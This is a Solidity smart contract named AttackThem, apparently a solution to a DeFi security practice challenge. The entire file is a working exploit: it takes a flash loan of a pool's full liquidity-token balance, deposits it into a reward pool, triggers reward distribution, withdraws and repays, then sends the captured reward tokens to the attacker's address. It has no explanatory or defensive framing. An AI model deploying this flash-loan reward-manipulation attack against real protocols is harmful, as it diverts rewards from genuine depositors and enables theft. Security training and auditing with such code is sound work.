pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool{
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

contract AttackThem{
    address private immutable attacker;
    IERC20 private immutable liquidityToken;
    IERC20 private immutable rewardToken;
    IFlashLoanerPool private immutable flashLoanerPool;
    ITheRewarderPool private immutable theRewarderPool;

   constructor(address _liquidityToken, address _rewardToken, address _flashLoanerPool, address _theRewarderPool){
        attacker = msg.sender;
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
        flashLoanerPool = IFlashLoanerPool(_flashLoanerPool);
        theRewarderPool = ITheRewarderPool(_theRewarderPool);
    }

    function attack() external{
        uint256 balance = liquidityToken.balanceOf(address(flashLoanerPool));
        flashLoanerPool.flashLoan(balance);
    }

    function receiveFlashLoan(uint256 amount) external{
        console.log(amount);
        liquidityToken.approve(address(theRewarderPool),  amount);
        theRewarderPool.deposit(amount);
        theRewarderPool.distributeRewards();
        theRewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanerPool), amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
    }
}